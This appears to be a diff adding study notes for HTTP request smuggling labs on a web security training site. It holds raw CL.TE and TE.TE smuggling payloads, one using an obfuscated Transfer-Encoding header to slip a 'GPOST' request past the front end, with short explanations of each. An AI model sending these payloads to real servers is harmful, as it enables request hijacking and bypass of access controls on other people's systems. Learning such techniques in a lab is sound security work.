@@ -1,0 +1,28 @@
+Content-Length: 6
+Connection: keep-alive
+Transfer-Encoding: chunked
+
+0
+
+G
+
+If Front end server is content-length, then the 6-byte body (because of crlf's) gets forwarded to the backend server. If the backend server uses transfer-encoding:chunked, then the first chunk is 0 length.
+The following byte, the 'G' is the start of the next request -> GPOST / HTTP/1.1
+
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+You need to include the trailing sequence \r\n\r\n following the final 0. 
